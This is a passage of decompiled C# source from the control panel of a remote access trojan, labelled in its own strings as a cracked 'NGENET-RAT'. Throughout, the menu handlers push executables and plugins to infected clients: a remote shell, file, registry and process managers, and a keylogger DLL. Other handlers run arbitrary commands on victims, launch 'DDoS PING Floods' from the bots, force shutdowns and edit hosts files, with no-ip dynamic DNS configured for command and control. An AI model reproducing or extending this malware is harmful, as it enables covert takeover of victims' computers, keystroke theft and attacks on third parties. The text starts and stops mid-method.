					this.noipstatus.Text = "Error - Update client support not available for supplied hostname or group";
				}
				if (array[1].Contains("14"))
				{
					this.noipstatus.Text = "Error - Hostname supplied does not have offline   settings configured. Returned if sending offline=YES on a host that  does  not have any offline actions configured.";
				}
				if (array[1].Contains("99"))
				{
					this.noipstatus.Text = "Error - Client disabled. Client should exit and not   perform any more updates without user intervention.";
				}
				if (array[1].Contains("100"))
				{
					this.noipstatus.Text = "Error - User input error usually returned if missing required request parameters";
				}
			}
			catch (Exception expr_2B2)
			{
				ProjectData.SetProjectError(expr_2B2);
				Exception ex = expr_2B2;
				this.noipstatus.Text = ex.Message;
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600026E RID: 622 RVA: 0x00002F0F File Offset: 0x0000110F
		private void LinkLabelNoip_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("http://www.noip.com/sign-up");
		}

		// Token: 0x0600026F RID: 623 RVA: 0x00002F1C File Offset: 0x0000111C
		private void Cnoip1_CheckedChanged(object sender, EventArgs e)
		{
			if (this.Cnoip1.Checked)
			{
				this.PasswordTextBox.PasswordChar = '*';
			}
			else
			{
				this.PasswordTextBox.PasswordChar = '\0';
			}
		}

		// Token: 0x06000270 RID: 624 RVA: 0x00019524 File Offset: 0x00017724
		private void SendRunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.L1.SelectedItems.Count != 0)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.FileName = "";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					bool flag = true;
					string text = Convert.ToBase64String(Fungsi.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag));
					byte[] array = Fungsi.SB(ref text);
					MemoryStream memoryStream = new MemoryStream();
					string text2 = "rn" + ima.Y + new FileInfo(openFileDialog.FileName).Extension + ima.Y;
					memoryStream.Write(Fungsi.SB(ref text2), 0, text2.Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(ima.SendTo), 1);
					thread.Start(new object[]
					{
						this.L1.SelectedItems,
						memoryStream.ToArray(),
						Color.WhiteSmoke
					});
				}
			}
		}

		// Token: 0x06000271 RID: 625 RVA: 0x0001962C File Offset: 0x0001782C
		private void UpdateToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.L1.SelectedItems.Count != 0)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "EXE|*.exe";
				openFileDialog.FileName = "";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					bool flag = true;
					string text = Convert.ToBase64String(Fungsi.ZIP(File.ReadAllBytes(openFileDialog.FileName), ref flag));
					byte[] array = Fungsi.SB(ref text);
					MemoryStream memoryStream = new MemoryStream();
					string text2 = "up" + ima.Y;
					memoryStream.Write(Fungsi.SB(ref text2), 0, text2.Length);
					memoryStream.Write(array, 0, array.Length);
					Thread thread = new Thread(new ParameterizedThreadStart(ima.SendTo), 1);
					thread.Start(new object[]
					{
						this.L1.SelectedItems,
						memoryStream.ToArray(),
						Color.WhiteSmoke
					});
				}
			}
		}

		// Token: 0x06000272 RID: 626 RVA: 0x00019728 File Offset: 0x00017928
		private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"un" + ima.Y + "@"
						}, null, null, null, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_7C)
			{
				ProjectData.SetProjectError(expr_7C);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000273 RID: 627 RVA: 0x000197DC File Offset: 0x000179DC
		private void UinstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"un" + ima.Y + "~"
						}, null, null, null, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_7C)
			{
				ProjectData.SetProjectError(expr_7C);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000274 RID: 628 RVA: 0x00019890 File Offset: 0x00017A90
		private void DisconnectServerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateSetComplex(listViewItem.Tag, null, "CN", new object[]
						{
							false
						}, null, null, false, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_6D)
			{
				ProjectData.SetProjectError(expr_6D);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000275 RID: 629 RVA: 0x00019934 File Offset: 0x00017B34
		private void CloseToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"un" + ima.Y + "!"
						}, null, null, null, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_7C)
			{
				ProjectData.SetProjectError(expr_7C);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000276 RID: 630 RVA: 0x000199E8 File Offset: 0x00017BE8
		private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG001.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start File Manager " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000277 RID: 631 RVA: 0x00019AA8 File Offset: 0x00017CA8
		private void ToolStripMenuItem3_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG002.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start Process Manager " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000278 RID: 632 RVA: 0x00019B68 File Offset: 0x00017D68
		private void InstalledManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG003.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start Uninstall Manager Desktop " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000279 RID: 633 RVA: 0x00019C28 File Offset: 0x00017E28
		private void StartupManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG004.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start Startup Manager " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600027A RID: 634 RVA: 0x00019CE8 File Offset: 0x00017EE8
		private void ToolStripMenuItem6_Click(object sender, EventArgs e)
		{
			if (this.ULT || this.PRS)
			{
				try
				{
					try
					{
						IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ListViewItem listViewItem = (ListViewItem)enumerator.Current;
							plg pLG = ima.GETPLG("NG005.ngg", null);
							ima.SendPlug((Client)listViewItem.Tag, pLG, false);
							Logsaktifitas.LOG("Start Fun Manager " + listViewItem.SubItems[5].Text);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					return;
				}
				catch (Exception expr_9A)
				{
					ProjectData.SetProjectError(expr_9A);
					ProjectData.ClearProjectError();
					return;
				}
			}
			ima.F.sl.Text = "3iezW0rld - TurkHacker346 NGENET-RAT Cracked";
		}

		// Token: 0x0600027B RID: 635 RVA: 0x00019DD0 File Offset: 0x00017FD0
		private void ToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG006.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start Remote Registry " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600027C RID: 636 RVA: 0x00019E90 File Offset: 0x00018090
		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG007.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start Remote Shell " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600027D RID: 637 RVA: 0x00019F50 File Offset: 0x00018150
		private void ConnectionsToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG008.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start Connection(s) " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600027E RID: 638 RVA: 0x0001A010 File Offset: 0x00018210
		private void NewTaskRunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Enter Name", "Create New Task", "", -1, -1);
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"run" + ima.Y + text
						}, null, null, null, true);
						listViewItem.Text = text;
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_95)
			{
				ProjectData.SetProjectError(expr_95);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600027F RID: 639 RVA: 0x0001A0DC File Offset: 0x000182DC
		private void RenameServerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Enter New Server ID", "Edit Server ID", "", -1, -1);
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"name" + ima.Y + text
						}, null, null, null, true);
						listViewItem.Text = text;
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_95)
			{
				ProjectData.SetProjectError(expr_95);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000280 RID: 640 RVA: 0x0001A1A8 File Offset: 0x000183A8
		private void ShellExecuteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string str = Interaction.InputBox("Enter your command", "ShellExecute", "", -1, -1);
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"com" + ima.Y + str
						}, null, null, null, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_8E)
			{
				ProjectData.SetProjectError(expr_8E);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000281 RID: 641 RVA: 0x0001A270 File Offset: 0x00018470
		private void OpenWebPageToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string str = Interaction.InputBox("Enter a url to open", "Open Web Page", "", -1, -1);
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"run" + ima.Y + str
						}, null, null, null, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_8E)
			{
				ProjectData.SetProjectError(expr_8E);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000282 RID: 642 RVA: 0x0001A338 File Offset: 0x00018538
		private void PingFloodsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Enter IP/URL ", "DDoS PING Floods", "", -1, -1);
			string text2 = Interaction.InputBox("Enter packet size (e.g \"3000 - 36000\"))", "Open Web Page", "", -1, -1);
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							string.Concat(new string[]
							{
								"com",
								ima.Y,
								"PING ",
								text,
								" -t -l ",
								text2
							})
						}, null, null, null, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_D5)
			{
				ProjectData.SetProjectError(expr_D5);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000283 RID: 643 RVA: 0x0001A444 File Offset: 0x00018644
		private void KillProcessToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string str = Interaction.InputBox("Enter process name", "Kill Process", "", -1, -1);
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"com" + ima.Y + "taskkill /F /IM " + str
						}, null, null, null, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_93)
			{
				ProjectData.SetProjectError(expr_93);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000284 RID: 644 RVA: 0x0001A510 File Offset: 0x00018710
		private void RestartComputerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"com" + ima.Y + "shutdown -r -t 00"
						}, null, null, null, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_7C)
			{
				ProjectData.SetProjectError(expr_7C);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000285 RID: 645 RVA: 0x0001A5C4 File Offset: 0x000187C4
		private void LogOffComputerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"com" + ima.Y + "shutdown -l -t 00"
						}, null, null, null, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_7C)
			{
				ProjectData.SetProjectError(expr_7C);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000286 RID: 646 RVA: 0x0001A678 File Offset: 0x00018878
		private void ShutDownComputerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"com" + ima.Y + "shutdown -s -t 00"
						}, null, null, null, true);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_7C)
			{
				ProjectData.SetProjectError(expr_7C);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000287 RID: 647 RVA: 0x00002F46 File Offset: 0x00001146
		private void ButtonNoip_Click(object sender, EventArgs e)
		{
			this.updatenoip = true;
		}

		// Token: 0x06000288 RID: 648 RVA: 0x0001A72C File Offset: 0x0001892C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			this.T = Operators.AddObject(this.T, 1);
			CHProgressbar prloading = this.prloading;
			checked
			{
				prloading.Value++;
				this.Labelloading.Text = Conversions.ToString(Operators.ConcatenateObject(this.T, "%"));
				if (Operators.ConditionalCompareObjectEqual(this.T, 70, false))
				{
					this.loadsettings();
				}
				else if (Operators.ConditionalCompareObjectEqual(this.T, 80, false))
				{
					this.loadedisi();
				}
				else if (Operators.ConditionalCompareObjectEqual(this.T, 90, false))
				{
					this.loadplugin();
				}
				else if (Operators.ConditionalCompareObjectEqual(this.T, 101, false))
				{
					Thread.Sleep(1000);
					ima.F.sl.Text = "Ready";
					this.Ploading.Visible = false;
					this.headertext = true;
					try
					{
						port1 port = new port1();
						port.TextBox1.Text = Fungsi.GTV("port", "1997");
						port.ShowDialog(this);
						if (port.port < 1)
						{
							this.Close();
							return;
						}
						this.port = port.port;
						this.S = new SocketServer(this.port);
						Fungsi.STV("port", Conversions.ToString(this.port));
						this.Lv1.FX();
						this.L1.FX();
						Size size = new Size(0, 0);
						this.MaximumSize = size;
						size = new Size(428, 352);
						this.MinimumSize = size;
					}
					catch (Exception expr_1A5)
					{
						ProjectData.SetProjectError(expr_1A5);
						ProjectData.ClearProjectError();
					}
					ima.W = this.S;
					this.Timer1.Stop();
				}
			}
		}

		// Token: 0x06000289 RID: 649 RVA: 0x0001A914 File Offset: 0x00018B14
		private void WindowsListToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG015.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start Service Manager " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600028A RID: 650 RVA: 0x0001A9D4 File Offset: 0x00018BD4
		private void ToolStripMenuItem7_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						plg pLG = ima.GETPLG("NG016.ngg", null);
						ima.SendPlug((Client)listViewItem.Tag, pLG, false);
						Logsaktifitas.LOG("Start Windows List " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_87)
			{
				ProjectData.SetProjectError(expr_87);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600028B RID: 651 RVA: 0x0001AA94 File Offset: 0x00018C94
		private void B1_Click(object sender, EventArgs e)
		{
			this.ControNe1.BringToFront();
			this.B5.BackColor = Color.FromArgb(10, 10, 10);
			this.B1.BackColor = Color.FromArgb(40, 40, 40);
			this.B2.BackColor = Color.FromArgb(10, 10, 10);
			this.B3.BackColor = Color.FromArgb(10, 10, 10);
			this.B4.BackColor = Color.FromArgb(10, 10, 10);
		}

		// Token: 0x0600028C RID: 652 RVA: 0x0001AB1C File Offset: 0x00018D1C
		private void B2_Click(object sender, EventArgs e)
		{
			this.ControlShatroom1.BringToFront();
			this.B5.BackColor = Color.FromArgb(10, 10, 10);
			this.B2.BackColor = Color.FromArgb(40, 40, 40);
			this.B1.BackColor = Color.FromArgb(10, 10, 10);
			this.B3.BackColor = Color.FromArgb(10, 10, 10);
			this.B4.BackColor = Color.FromArgb(10, 10, 10);
		}

		// Token: 0x0600028D RID: 653 RVA: 0x0001ABA4 File Offset: 0x00018DA4
		private void B3_Click(object sender, EventArgs e)
		{
			if (this.ULT)
			{
				this.ControlDetector1.BringToFront();
			}
			else
			{
				if (!this.PRS)
				{
					ima.F.sl.Text = "3iezW0rld - TurkHacker346 NGENET-RAT Cracked!";
					return;
				}
				this.ControlDetector1.BringToFront();
			}
			this.B5.BackColor = Color.FromArgb(10, 10, 10);
			this.B3.BackColor = Color.FromArgb(40, 40, 40);
			this.B2.BackColor = Color.FromArgb(10, 10, 10);
			this.B1.BackColor = Color.FromArgb(10, 10, 10);
			this.B4.BackColor = Color.FromArgb(10, 10, 10);
		}

		// Token: 0x0600028E RID: 654 RVA: 0x0001AC60 File Offset: 0x00018E60
		private void B4_Click(object sender, EventArgs e)
		{
			this.B4.BackColor = Color.FromArgb(40, 40, 40);
			this.B2.BackColor = Color.FromArgb(10, 10, 10);
			this.B3.BackColor = Color.FromArgb(10, 10, 10);
			this.B1.BackColor = Color.FromArgb(10, 10, 10);
			this.B5.BackColor = Color.FromArgb(10, 10, 10);
			this.PanelNews.BringToFront();
		}

		// Token: 0x0600028F RID: 655 RVA: 0x0001ACE8 File Offset: 0x00018EE8
		private void Button14_Click(object sender, EventArgs e)
		{
			try
			{
				File.WriteAllText(Application.StartupPath + "\\Bin\\Globalnotes.txt", this.TextBox1.Text);
				ima.F.sl.Text = "Save succeeded..";
			}
			catch (Exception expr_36)
			{
				ProjectData.SetProjectError(expr_36);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000290 RID: 656 RVA: 0x0001AD4C File Offset: 0x00018F4C
		private void EditFileHostToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						NewLateBinding.LateCall(listViewItem.Tag, null, "send", new object[]
						{
							"edhost"
						}, null, null, null, true);
						Logsaktifitas.LOG("Start Edit File Host " + listViewItem.SubItems[5].Text);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_8E)
			{
				ProjectData.SetProjectError(expr_8E);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000291 RID: 657 RVA: 0x0001AE14 File Offset: 0x00019014
		private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem arg_23_0 = (ListViewItem)enumerator.Current;
						bool flag = true;
						string text = "Plugins\\RemoteKeyLogger.dll";
						string text2 = Convert.ToBase64String(Fungsi.ZIP(File.ReadAllBytes(text), ref flag));
						byte[] array = Fungsi.SB(ref text2);
						MemoryStream memoryStream = new MemoryStream();
						string text3 = "plg" + ima.Y + new FileInfo(text).Name + ima.Y;
						memoryStream.Write(Fungsi.SB(ref text3), 0, text3.Length);
						memoryStream.Write(array, 0, array.Length);
						Thread thread = new Thread(new ParameterizedThreadStart(ima.SendTo), 1);
						thread.Start(new object[]
						{
							this.L1.SelectedItems,
							memoryStream.ToArray(),
							Color.WhiteSmoke
						});
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			catch (Exception expr_10A)
			{
				ProjectData.SetProjectError(expr_10A);
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000292 RID: 658 RVA: 0x00002F54 File Offset: 0x00001154
		private void Button11_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000293 RID: 659 RVA: 0x0001AF70 File Offset: 0x00019170
		private void Button12_Click(object sender, EventArgs e)
		{
			this.Sthmb.Checked = false;
			this.sthmb1.Checked = false;
			this.Pwidth.Value = new decimal(100L);
			this.Phight.Value = new decimal(64L);
			this.Prefresh.Value = new decimal(7L);
			this.Snotif.Checked = true;
			this.Snotif2.Checked = true;
			this.SLGS1.Checked = true;
			this.SLGS2.Checked = true;
			this.SLGS3.Checked = true;
			this.SAUT.Checked = true;
			this.SAUT1.Checked = true;
			this.SAUT2.Checked = true;
			this.HostTextBox.Text = "";
			this.UsernameTextBox.Text = "";
			this.PasswordTextBox.Text = "";
			this.Cnoip.Checked = false;
			this.Cnoip1.Checked = false;
			this.Comboape.SelectedIndex = 0;
			this.SC1.Checked = false;
			this.SC2.Checked = false;
			ima.F.sl.Text = "Default Settings..";
		}

		// Token: 0x06000294 RID: 660 RVA: 0x0001B0C0 File Offset: 0x000192C0
		private void UsersFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					try
					{
						Process.Start(string.Concat(new string[]
						{
							Application.StartupPath,
							"\\Users\\",
							listViewItem.SubItems[5].Text,
							"-",
							listViewItem.SubItems[6].Text
						}));
					}
					catch (Exception expr_75)
					{
						ProjectData.SetProjectError(expr_75);
						ProjectData.ClearProjectError();
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000295 RID: 661 RVA: 0x0001B190 File Offset: 0x00019390
		private void DesktopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				try
				{
					IEnumerator enumerator = this.L1.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
